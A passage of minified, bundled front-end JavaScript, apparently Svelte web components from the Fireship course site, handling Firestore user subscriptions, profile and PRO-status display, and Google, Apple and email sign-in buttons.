  return null == (e = Object.values(Ot).find((t) => t.legacy_sku === n))
    ? void 0
    : e.id;
}
function jr(n = window.location.pathname) {
  const e = n.split("/"),
    t = e.findIndex((r) => "courses" === r) + 1;
  return null == e ? void 0 : e[t];
}
const zr = Se(null),
  gt = Se(null),
  Lt = Se(null),
  hr = Se(null);
let Qn, er, tr;
ad(je, async (n) => {
  if ((zr.set(n), n)) {
    const {
        doc: e,
        onSnapshot: t,
        getFirestore: r,
      } = await ft(() => import("./index.esm.16fddf16.js"), []),
      i = r(),
      o = e(i, `users/${n.uid}`),
      s = e(i, `progress/${n.uid}`),
      a = e(i, `seats/${n.uid}`);
    (Qn = t(o, (l) => {
      var c;
      gt.set(l.data()),
        null != (c = l.data()) &&
          c.enterprise &&
          (tr = t(a, (d) => {
            hr.set(d.data());
          }));
    })),
      (er = t(s, (l) => {
        Lt.set(l.data());
      })),
      Mi(n.uid);
  } else
    Qn && Qn(),
      er && er(),
      tr && tr(),
      gt.set(null),
      Lt.set(null),
      hr.set(null),
      Mi(null);
});
const Zt = Rs([gt, Rn], ([n, e]) => {
  var r, i, o;
  const t = jr(null == e ? void 0 : e.permalink);
  return !!(
    (null == n ? void 0 : n.is_pro) ||
    (null == (r = null == n ? void 0 : n.courses) ? void 0 : r[t]) ||
    (null == (o = null == n ? void 0 : n.products)
      ? void 0
      : o[null == (i = Ot[t]) ? void 0 : i.legacy_sku])
  );
});
function Di(n, e, t) {
  const r = n.slice();
  return (r[7] = e[t]), r;
}
function Ui(n) {
  var r;
  let t,
    e = (null == (r = n[4]) ? void 0 : r.email) + "";
  return {
    c() {
      t = A(e);
    },
    m(i, o) {
      p(i, t, o);
    },
    p(i, o) {
      var s;
      16 & o &&
        e !== (e = (null == (s = i[4]) ? void 0 : s.email) + "") &&
        U(t, e);
    },
    d(i) {
      i && g(t);
    },
  };
}
function Fi(n) {
  let e, t, r, i;
  return {
    c() {
      (e = b("img")),
        Pt(e.src, (t = n[2])) || w(e, "src", t),
        w(e, "alt", "avatar"),
        w(e, "referrerpolicy", "no-referrer"),
        Jr(e, "max-width", "100%"),
        Jr(e, "border-radius", "9999px");
    },
    m(o, s) {
      p(o, e, s), r || ((i = O(e, "error", n[6])), (r = !0));
    },
    p(o, s) {
      4 & s && !Pt(e.src, (t = o[2])) && w(e, "src", t);
    },
    d(o) {
      o && g(e), (r = !1), i();
    },
  };
}
function Hi(n) {
  var r;
  let t,
    e = (null == (r = n[4]) ? void 0 : r.displayName) + "";
  return {
    c() {
      t = A(e);
    },
    m(i, o) {
      p(i, t, o);
    },
    p(i, o) {
      var s;
      16 & o &&
        e !== (e = (null == (s = i[4]) ? void 0 : s.displayName) + "") &&
        U(t, e);
    },
    d(i) {
      i && g(t);
    },
  };
}
function ji(n) {
  var r;
  let t,
    e = (null == (r = n[4]) ? void 0 : r.uid) + "";
  return {
    c() {
      t = A(e);
    },
    m(i, o) {
      p(i, t, o);
    },
    p(i, o) {
      var s;
      16 & o &&
        e !== (e = (null == (s = i[4]) ? void 0 : s.uid) + "") &&
        U(t, e);
    },
    d(i) {
      i && g(t);
    },
  };
}
function zi(n) {
  var r, i;
  let t,
    e = Yi(null != (i = null == (r = n[5]) ? void 0 : r.xp) ? i : 0) + "";
  return {
    c() {
      t = A(e);
    },
    m(o, s) {
      p(o, t, s);
    },
    p(o, s) {
      var a, l;
      32 & s &&
        e !==
          (e =
            Yi(null != (l = null == (a = o[5]) ? void 0 : a.xp) ? l : 0) +
            "") &&
        U(t, e);
    },
    d(o) {
      o && g(t);
    },
  };
}
function Bi(n) {
  var r, i, o;
  let t,
    e =
      (null !=
      (o =
        null == (i = null == (r = n[5]) ? void 0 : r.xp)
          ? void 0
          : i.toLocaleString())
        ? o
        : 0) + "";
  return {
    c() {
      t = A(e);
    },
    m(s, a) {
      p(s, t, a);
    },
    p(s, a) {
      var l, c, d;
      32 & a &&
        e !==
          (e =
            (null !=
            (d =
              null == (c = null == (l = s[5]) ? void 0 : l.xp)
                ? void 0
                : c.toLocaleString())
              ? d
              : 0) + "") &&
        U(t, e);
    },
    d(s) {
      s && g(t);
    },
  };
}
function Vi(n) {
  var r;
  let e,
    t = (null == (r = n[1]) ? void 0 : r.expires) && $i(n);
  return {
    c() {
      t && t.c(), (e = ee());
    },
    m(i, o) {
      t && t.m(i, o), p(i, e, o);
    },
    p(i, o) {
      var s;
      null != (s = i[1]) && s.expires
        ? t
          ? t.p(i, o)
          : ((t = $i(i)), t.c(), t.m(e.parentNode, e))
        : t && (t.d(1), (t = null));
    },
    d(i) {
      t && t.d(i), i && g(e);
    },
  };
}
function $i(n) {
  var i;
  let e,
    r,
    t = Ji(null == (i = n[1]) ? void 0 : i.expires) + "";
  return {
    c() {
      (e = A("Your PRO access expires ")), (r = A(t));
    },
    m(o, s) {
      p(o, e, s), p(o, r, s);
    },
    p(o, s) {
      var a;
      2 & s &&
        t !== (t = Ji(null == (a = o[1]) ? void 0 : a.expires) + "") &&
        U(r, t);
    },
    d(o) {
      o && g(e), o && g(r);
    },
  };
}
function qi(n) {
  var r;
  let e,
    t = (null == (r = n[3]) ? void 0 : r.length) && Wi(n);
  return {
    c() {
      t && t.c(), (e = ee());
    },
    m(i, o) {
      t && t.m(i, o), p(i, e, o);
    },
    p(i, o) {
      var s;
      null != (s = i[3]) && s.length
        ? t
          ? t.p(i, o)
          : ((t = Wi(i)), t.c(), t.m(e.parentNode, e))
        : t && (t.d(1), (t = null));
    },
    d(i) {
      t && t.d(i), i && g(e);
    },
  };
}
function Wi(n) {
  let e,
    t,
    r,
    i = n[3],
    o = [];
  for (let s = 0; s < i.length; s += 1) o[s] = Gi(Di(n, i, s));
  return {
    c() {
      (e = b("h3")),
        (e.textContent = "Purchased Courses"),
        (t = E()),
        (r = b("ul"));
      for (let s = 0; s < o.length; s += 1) o[s].c();
    },
    m(s, a) {
      p(s, e, a), p(s, t, a), p(s, r, a);
      for (let l = 0; l < o.length; l += 1) o[l].m(r, null);
    },
    p(s, a) {
      if (8 & a) {
        let l;
        for (i = s[3], l = 0; l < i.length; l += 1) {
          const c = Di(s, i, l);
          o[l] ? o[l].p(c, a) : ((o[l] = Gi(c)), o[l].c(), o[l].m(r, null));
        }
        for (; l < o.length; l += 1) o[l].d(1);
        o.length = i.length;
      }
    },
    d(s) {
      s && g(e), s && g(t), s && g(r), at(o, s);
    },
  };
}
function Gi(n) {
  let e,
    t,
    i,
    o,
    r = n[7] + "";
  return {
    c() {
      (e = b("li")),
        (t = b("a")),
        (i = A(r)),
        w(t, "href", (o = `/courses/${n[7]}`));
    },
    m(s, a) {
      p(s, e, a), h(e, t), h(t, i);
    },
    p(s, a) {
      8 & a && r !== (r = s[7] + "") && U(i, r),
        8 & a && o !== (o = `/courses/${s[7]}`) && w(t, "href", o);
    },
    d(s) {
      s && g(e);
    },
  };
}
function Ki(n) {
  var o, s;
  let e,
    r,
    i,
    t =
      (null != (s = null == (o = n[1]) ? void 0 : o.pro_status) ? s : "basic") +
      "";
  return {
    c() {
      var a, l;
      (e = b("span")),
        (r = A(t)),
        w(
          e,
          "class",
          (i =
            null != (l = null == (a = n[1]) ? void 0 : a.pro_status)
              ? l
              : "basic")
        );
    },
    m(a, l) {
      p(a, e, l), h(e, r);
    },
    p(a, l) {
      var c, d, u, f;
      2 & l &&
        t !==
          (t =
            (null != (d = null == (c = a[1]) ? void 0 : c.pro_status)
              ? d
              : "basic") + "") &&
        U(r, t),
        2 & l &&
          i !==
            (i =
              null != (f = null == (u = a[1]) ? void 0 : u.pro_status)
                ? f
                : "basic") &&
          w(e, "class", i);
    },
    d(a) {
      a && g(e);
    },
  };
}
function eh(n) {
  let e,
    t,
    r,
    i,
    o,
    s,
    a,
    l,
    c,
    d = "email" === n[0] && Ui(n),
    u = "photoURL" === n[0] && Fi(n),
    f = "displayName" === n[0] && Hi(n),
    m = "uid" === n[0] && ji(n),
    y = "xp" === n[0] && zi(n),
    I = "xp-raw" === n[0] && Bi(n),
    v = "expires" === n[0] && Vi(n),
    R = "courses" === n[0] && qi(n),
    L = "status" === n[0] && Ki(n);
  return {
    c() {
      d && d.c(),
        (e = E()),
        u && u.c(),
        (t = E()),
        f && f.c(),
        (r = E()),
        m && m.c(),
        (i = E()),
        y && y.c(),
        (o = E()),
        I && I.c(),
        (s = E()),
        v && v.c(),
        (a = E()),
        R && R.c(),
        (l = E()),
        L && L.c(),
        (c = ee()),
        (this.c = k);
    },
    m(_, P) {
      d && d.m(_, P),
        p(_, e, P),
        u && u.m(_, P),
        p(_, t, P),
        f && f.m(_, P),
        p(_, r, P),
        m && m.m(_, P),
        p(_, i, P),
        y && y.m(_, P),
        p(_, o, P),
        I && I.m(_, P),
        p(_, s, P),
        v && v.m(_, P),
        p(_, a, P),
        R && R.m(_, P),
        p(_, l, P),
        L && L.m(_, P),
        p(_, c, P);
    },
    p(_, [P]) {
      "email" === _[0]
        ? d
          ? d.p(_, P)
          : ((d = Ui(_)), d.c(), d.m(e.parentNode, e))
        : d && (d.d(1), (d = null)),
        "photoURL" === _[0]
          ? u
            ? u.p(_, P)
            : ((u = Fi(_)), u.c(), u.m(t.parentNode, t))
          : u && (u.d(1), (u = null)),
        "displayName" === _[0]
          ? f
            ? f.p(_, P)
            : ((f = Hi(_)), f.c(), f.m(r.parentNode, r))
          : f && (f.d(1), (f = null)),
        "uid" === _[0]
          ? m
            ? m.p(_, P)
            : ((m = ji(_)), m.c(), m.m(i.parentNode, i))
          : m && (m.d(1), (m = null)),
        "xp" === _[0]
          ? y
            ? y.p(_, P)
            : ((y = zi(_)), y.c(), y.m(o.parentNode, o))
          : y && (y.d(1), (y = null)),
        "xp-raw" === _[0]
          ? I
            ? I.p(_, P)
            : ((I = Bi(_)), I.c(), I.m(s.parentNode, s))
          : I && (I.d(1), (I = null)),
        "expires" === _[0]
          ? v
            ? v.p(_, P)
            : ((v = Vi(_)), v.c(), v.m(a.parentNode, a))
          : v && (v.d(1), (v = null)),
        "courses" === _[0]
          ? R
            ? R.p(_, P)
            : ((R = qi(_)), R.c(), R.m(l.parentNode, l))
          : R && (R.d(1), (R = null)),
        "status" === _[0]
          ? L
            ? L.p(_, P)
            : ((L = Ki(_)), L.c(), L.m(c.parentNode, c))
          : L && (L.d(1), (L = null));
    },
    i: k,
    o: k,
    d(_) {
      d && d.d(_),
        _ && g(e),
        u && u.d(_),
        _ && g(t),
        f && f.d(_),
        _ && g(r),
        m && m.d(_),
        _ && g(i),
        y && y.d(_),
        _ && g(o),
        I && I.d(_),
        _ && g(s),
        v && v.d(_),
        _ && g(a),
        R && R.d(_),
        _ && g(l),
        L && L.d(_),
        _ && g(c);
    },
  };
}
function Yi(n) {
  return Intl.NumberFormat("en", { notation: "compact" }).format(n);
}
function Ji(n) {
  if (!n) return "never";
  let e = new Intl.RelativeTimeFormat("en", { numeric: "auto" }),
    t = -Math.floor((Date.now() - 1e3 * n) / 1e3) / 86400;
  return e.format(Math.floor(t), "day");
}
function th(n, e, t) {
  var d;
  let r, i, o, s;
  ie(n, gt, (u) => t(1, (i = u))),
    ie(n, zr, (u) => t(4, (o = u))),
    ie(n, Lt, (u) => t(5, (s = u)));
  let { field: a } = e,
    l =
      null != (d = null == o ? void 0 : o.photoURL) ? d : "/img/ui/avatar.svg";
  return (
    (n.$$set = (u) => {
      "field" in u && t(0, (a = u.field));
    }),
    (n.$$.update = () => {
      2 & n.$$.dirty &&
        t(
          3,
          (r = [
            ...Object.keys((null == i ? void 0 : i.courses) || {}),
            ...Object.keys((null == i ? void 0 : i.products) || {}).map(Qp),
          ].filter(Boolean))
        );
    }),
    [a, i, l, r, o, s, () => t(2, (l = "/img/ui/avatar.svg"))]
  );
}
class nh extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>h3{font-family:cubano, sans-serif;font-weight:400;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))\n}a{--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none\n}ul{margin-bottom:2.5rem\n}.basic{--tw-text-opacity:1;color:rgb(108 121 131 / var(--tw-text-opacity))\n}.active{--tw-text-opacity:1;color:rgb(34 197 94 / var(--tw-text-opacity))\n}.cancelled{--tw-text-opacity:1;color:rgb(234 179 8 / var(--tw-text-opacity))\n}.enterprise{--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))\n}.lifetime{--tw-text-opacity:1;color:rgb(34 197 94 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        th,
        eh,
        G,
        { field: 0 },
        null
      ),
      e &&
        (e.target && p(e.target, this, e.anchor),
        e.props && (this.$set(e.props), W()));
  }
  static get observedAttributes() {
    return ["field"];
  }
  get field() {
    return this.$$.ctx[0];
  }
  set field(e) {
    this.$$set({ field: e }), W();
  }
}
function rh(n) {
  let e, t, r;
  return {
    c() {
      (e = b("button")),
        (e.innerHTML =
          '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><g transform="matrix(1, 0, 0, 1, 27.009001, -39.238998)"><path fill="#4285F4" d="M -3.264 51.509 C -3.264 50.719 -3.334 49.969 -3.454 49.239 L -14.754 49.239 L -14.754 53.749 L -8.284 53.749 C -8.574 55.229 -9.424 56.479 -10.684 57.329 L -10.684 60.329 L -6.824 60.329 C -4.564 58.239 -3.264 55.159 -3.264 51.509 Z"></path><path fill="#34A853" d="M -14.754 63.239 C -11.514 63.239 -8.804 62.159 -6.824 60.329 L -10.684 57.329 C -11.764 58.049 -13.134 58.489 -14.754 58.489 C -17.884 58.489 -20.534 56.379 -21.484 53.529 L -25.464 53.529 L -25.464 56.619 C -23.494 60.539 -19.444 63.239 -14.754 63.239 Z"></path><path fill="#FBBC05" d="M -21.484 53.529 C -21.734 52.809 -21.864 52.039 -21.864 51.239 C -21.864 50.439 -21.724 49.669 -21.484 48.949 L -21.484 45.859 L -25.464 45.859 C -26.284 47.479 -26.754 49.299 -26.754 51.239 C -26.754 53.179 -26.284 54.999 -25.464 56.619 L -21.484 53.529 Z"></path><path fill="#EA4335" d="M -14.754 43.989 C -12.984 43.989 -11.404 44.599 -10.154 45.789 L -6.734 42.369 C -8.804 40.429 -11.514 39.239 -14.754 39.239 C -19.444 39.239 -23.494 41.939 -25.464 45.859 L -21.484 48.949 C -20.534 46.099 -17.884 43.989 -14.754 43.989 Z"></path></g></svg>\n    Sign in with Google'),
        (this.c = k);
    },
    m(i, o) {
      p(i, e, o), t || ((r = O(e, "click", Vp)), (t = !0));
    },
    p: k,
    i: k,
    o: k,
    d(i) {
      i && g(e), (t = !1), r();
    },
  };
}
customElements.define("user-data", nh);
class ih extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>button{margin-top:0.125rem;margin-bottom:0.125rem;display:inline-flex;width:100%;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity));padding-left:1rem;padding-right:1rem;padding-top:0.75rem;padding-bottom:0.75rem;font-family:sofia-pro, sans-serif;font-size:1rem;line-height:1.5rem;--tw-text-opacity:1;color:rgb(0 0 0 / var(--tw-text-opacity));--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)\n}svg{position:relative;top:0.25rem;margin-right:0.5rem;height:1.25rem;width:1.25rem\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        null,
        rh,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function oh(n) {
  let e, t, r;
  return {
    c() {
      (e = b("button")),
        (e.innerHTML =
          '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" width="814px" height="1000px" viewBox="0 0 814 1000" enable-background="new 0 0 814 1000" xml:space="preserve"><path d="M788.1,340.9c-5.8,4.5-108.2,62.2-108.2,190.5c0,148.4,130.3,200.9,134.2,202.2c-0.6,3.2-20.7,71.9-68.7,141.9  c-42.8,61.6-87.5,123.1-155.5,123.1s-85.5-39.5-164-39.5c-76.5,0-103.7,40.8-165.9,40.8s-105.6-57-155.5-127  C46.7,790.7,0,663,0,541.8c0-194.4,126.4-297.5,250.8-297.5c66.1,0,121.2,43.4,162.7,43.4c39.5,0,101.1-46,176.3-46  C618.3,241.7,720.7,244.3,788.1,340.9z M554.1,159.4c31.1-36.9,53.1-88.1,53.1-139.3c0-7.1-0.6-14.3-1.9-20.1  c-50.6,1.9-110.8,33.7-147.1,75.8c-28.5,32.4-55.1,83.6-55.1,135.5c0,7.8,1.3,15.6,1.9,18.1c3.2,0.6,8.4,1.3,13.6,1.3  C464,230.7,521.1,200.3,554.1,159.4z"></path></svg>\n    Sign in with Apple'),
        (this.c = k);
    },
    m(i, o) {
      p(i, e, o), t || ((r = O(e, "click", $p)), (t = !0));
    },
    p: k,
    i: k,
    o: k,
    d(i) {
      i && g(e), (t = !1), r();
    },
  };
}
customElements.define("google-signin", ih);
class sh extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>button{margin-top:0.125rem;margin-bottom:0.125rem;display:inline-flex;width:100%;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity));padding-left:1rem;padding-right:1rem;padding-top:0.75rem;padding-bottom:0.75rem;font-family:sofia-pro, sans-serif;font-size:1rem;line-height:1.5rem;--tw-text-opacity:1;color:rgb(0 0 0 / var(--tw-text-opacity));--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)\n}svg{position:relative;top:0.125rem;margin-right:0.5rem;height:1.25rem;width:1.25rem\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        null,
        oh,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function Xi(n) {
  let e, t;
  return {
    c() {
      (e = b("p")), (t = A(n[5])), w(e, "class", "error");
    },
    m(r, i) {
      p(r, e, i), h(e, t);
    },
    p(r, i) {
      32 & i && U(t, r[5]);
    },
    d(r) {
      r && g(e);
    },
  };
}
function Zi(n) {
  let e, t;
  return {
    c() {
      (e = b("p")), (t = A(n[4])), w(e, "class", "success");
    },
    m(r, i) {
      p(r, e, i), h(e, t);
    },
    p(r, i) {
      16 & i && U(t, r[4]);
    },
    d(r) {
      r && g(e);
    },
  };
}
function ah(n) {
  let e,
    t,
    r,
    i,
    o,
    s,
    a,
    l,
    c,
    d,
    u,
    f = n[5] && Xi(n),
    m = n[4] && Zi(n);
  return {
    c() {
      (e = b("form")),
        (t = b("label")),
        (t.textContent = "Email"),
        (r = E()),
        (i = b("input")),
        (o = E()),
        f && f.c(),
        (s = E()),
        m && m.c(),
        (a = E()),
        (l = b("input")),
        (this.c = k),
        w(t, "for", "email"),
        w(i, "class", "input"),
        w(i, "type", "email"),
        w(i, "name", "email"),
        (i.required = !0),
        Z(i, "touched", n[2]),
        w(l, "class", "btn"),
        w(l, "type", "submit"),
        (l.value = c = n[3] ? "sending..." : "send"),
        Z(l, "disabled", !n[1] || n[3]);
    },
    m(y, I) {
      p(y, e, I),
        h(e, t),
        h(e, r),
        h(e, i),
        n[8](i),
        h(e, o),
        f && f.m(e, null),
        h(e, s),
        m && m.m(e, null),
        h(e, a),
        h(e, l),
        d ||
          ((u = [
            O(i, "input", n[6]),
            O(i, "focus", n[9], { once: !0 }),
            O(e, "submit", dl(n[7])),
          ]),
          (d = !0));
    },
    p(y, [I]) {
      4 & I && Z(i, "touched", y[2]),
        y[5]
          ? f
            ? f.p(y, I)
            : ((f = Xi(y)), f.c(), f.m(e, s))
          : f && (f.d(1), (f = null)),
        y[4]
          ? m
            ? m.p(y, I)
            : ((m = Zi(y)), m.c(), m.m(e, a))
          : m && (m.d(1), (m = null)),
        8 & I && c !== (c = y[3] ? "sending..." : "send") && (l.value = c),
        10 & I && Z(l, "disabled", !y[1] || y[3]);
    },
    i: k,
    o: k,
    d(y) {
      y && g(e), n[8](null), f && f.d(), m && m.d(), (d = !1), fe(u);
    },
  };
}
function lh(n, e, t) {
  let r,
    a,
    l,
    i = !1,
    o = !1,
    s = !1;
  return [
    r,
    i,
    o,
    s,
    a,
    l,
    function c() {
      t(1, (i = r.validity.valid));
    },
    async function d(m) {
      const y = r.value,
        I = window.location.href;
      t(3, (s = !0));
      const { res: v, serverError: R } = await qp(y, I);
      t(3, (s = !1)), t(5, (l = R)), t(4, (a = v));
    },
    function u(m) {
      st[m ? "unshift" : "push"](() => {
        (r = m), t(0, r);
      });
    },
    () => t(2, (o = !0)),
  ];
}
customElements.define("apple-signin", sh);
class ch extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>.input{display:block;width:100%;border-radius:0px;border-bottom-width:4px;border-top-width:0px;border-right-width:0px;border-left-width:0px;--tw-border-opacity:1;border-bottom-color:rgb(255 255 255 / var(--tw-border-opacity));background-color:rgb(18 24 27 / var(--tw-bg-opacity));--tw-bg-opacity:0.3;padding-top:0.75rem;padding-bottom:0.75rem;padding-left:0.25rem;padding-right:0.25rem;font-size:1.125rem;line-height:1.75rem;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));outline:2px solid transparent;outline-offset:2px\n}.input:focus-visible{outline:2px solid transparent;outline-offset:2px\n}label{font-weight:700;--tw-text-opacity:1;color:rgb(178 190 205 / var(--tw-text-opacity))\n}input[type='email']:valid{--tw-border-opacity:1;border-bottom-color:rgb(34 197 94 / var(--tw-border-opacity))\n}.btn{margin-top:0.5rem;margin-bottom:0.5rem;display:inline-block;width:auto;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity));padding-left:1rem;padding-right:1rem;padding-top:0.75rem;padding-bottom:0.75rem;text-align:center;font-family:sofia-pro, sans-serif;font-weight:700;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)\n}.btn:hover{--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity))\n}.disabled{cursor:not-allowed;opacity:0.5\n}.touched{border-bottom-width:4px;--tw-border-opacity:1;border-bottom-color:rgb(59 130 246 / var(--tw-border-opacity))\n}.error{font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(239 68 68 / var(--tw-text-opacity))\n}.success{font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(34 197 94 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        lh,
        ah,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function uh(n) {
  let e, t, r;
  return {
    c() {
      (e = b("span")), (e.innerHTML = "<slot></slot>"), (this.c = k);
    },
    m(i, o) {
      p(i, e, o), t || ((r = O(e, "click", Fr)), (t = !0));
    },
    p: k,
    i: k,
    o: k,
    d(i) {
      i && g(e), (t = !1), r();
    },
  };
}
customElements.define("email-signin", ch);
class dh extends K {
  constructor(e) {
    super(),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        null,
        uh,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function fh(n) {
  let e;
  return {
    c() {
      (e = b("modal-dialog")),
        (e.innerHTML =
          '<h1>Login</h1> \n  <p>With magic email link:</p> \n  <email-signin></email-signin> \n  <p>Or with account:</p> \n  <google-signin></google-signin> \n  <apple-signin></apple-signin> \n  <p class="footer">By signing up, you agree to Fireship&#39;s Terms of Service &amp; Privacy Policy.</p>'),
        (this.c = k),
        Te(e, "name", "signin"),
        Te(e, "esc", "true");
    },
    m(t, r) {
      p(t, e, r);
    },
    p: k,
    i: k,
    o: k,
    d(t) {
      t && g(e);
    },
  };
}
customElements.define("sign-out", dh);
class ph extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>.footer{font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(108 121 131 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        null,
        fh,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function Qi(n) {
  let e;
  return {
    c() {
      (e = b("slot")), w(e, "name", "pro");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function eo(n) {
  let e;
  return {
    c() {
      (e = b("slot")), w(e, "name", "basic");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function to(n) {
  let e;
  return {
    c() {
      (e = b("slot")), w(e, "name", "lifetime");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function no(n) {
  let e;
  return {
    c() {
      (e = b("slot")), w(e, "name", "enterprise");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function ro(n) {
  let e;
  return {
    c() {
      (e = b("slot")), w(e, "name", "canceled");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function hh(n) {
  var u, f, m, y, I;
  let e,
    t,
    r,
    i,
    o,
    s = (null == (u = n[0]) ? void 0 : u.is_pro) && Qi(),
    a = !(null != (f = n[0]) && f.is_pro) && eo(),
    l = "lifetime" === (null == (m = n[0]) ? void 0 : m.pro_status) && to(),
    c = (null == (y = n[0]) ? void 0 : y.enterprise) && no(),
    d = "canceled" === (null == (I = n[0]) ? void 0 : I.pro_status) && ro();
  return {
    c() {
      s && s.c(),
        (e = E()),
        a && a.c(),
        (t = E()),
        l && l.c(),
        (r = E()),
        c && c.c(),
        (i = E()),
        d && d.c(),
        (o = ee()),
        (this.c = k);
    },
    m(v, R) {
      s && s.m(v, R),
        p(v, e, R),
        a && a.m(v, R),
        p(v, t, R),
        l && l.m(v, R),
        p(v, r, R),
        c && c.m(v, R),
        p(v, i, R),
        d && d.m(v, R),
        p(v, o, R);
    },
    p(v, [R]) {
      var L, _, P, te, ne;
      null != (L = v[0]) && L.is_pro
        ? s || ((s = Qi()), s.c(), s.m(e.parentNode, e))
        : s && (s.d(1), (s = null)),
        null != (_ = v[0]) && _.is_pro
          ? a && (a.d(1), (a = null))
          : a || ((a = eo()), a.c(), a.m(t.parentNode, t)),
        "lifetime" === (null == (P = v[0]) ? void 0 : P.pro_status)
          ? l || ((l = to()), l.c(), l.m(r.parentNode, r))
          : l && (l.d(1), (l = null)),
        null != (te = v[0]) && te.enterprise
          ? c || ((c = no()), c.c(), c.m(i.parentNode, i))
          : c && (c.d(1), (c = null)),
        "canceled" === (null == (ne = v[0]) ? void 0 : ne.pro_status)
          ? d || ((d = ro()), d.c(), d.m(o.parentNode, o))
          : d && (d.d(1), (d = null));
    },
    i: k,
    o: k,
    d(v) {
      s && s.d(v),
        v && g(e),
        a && a.d(v),
        v && g(t),
        l && l.d(v),
        v && g(r),
        c && c.d(v),
        v && g(i),
        d && d.d(v),
        v && g(o);
    },
  };
}
function mh(n, e, t) {
  let r;
  return ie(n, gt, (i) => t(0, (r = i))), [r];
}
customElements.define("app-signin", ph);
class gh extends K {
  constructor(e) {
    super(),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        mh,
        hh,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function bh(n) {
  let e;
  return {
    c() {
      (e = b("slot")), w(e, "name", "signed-out");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function wh(n) {
  let e;
  return {
    c() {
      e = b("slot");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function _h(n) {
  let e;
  function t(o, s) {
    return o[0] ? wh : bh;
  }
  let r = t(n),
    i = r(n);
  return {
    c() {
      i.c(), (e = ee()), (this.c = k);
    },
    m(o, s) {
      i.m(o, s), p(o, e, s);
    },
    p(o, [s]) {
      r !== (r = t(o)) &&
        (i.d(1), (i = r(o)), i && (i.c(), i.m(e.parentNode, e)));
    },
    i: k,
    o: k,
    d(o) {
      i.d(o), o && g(e);
    },
  };
}
function yh(n, e, t) {
  let r;
  return ie(n, zr, (i) => t(0, (r = i))), [r];
}
customElements.define("if-pro", gh);
class vh extends K {
  constructor(e) {
    super(),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        yh,
        _h,
        G,
        {},
        null
      ),
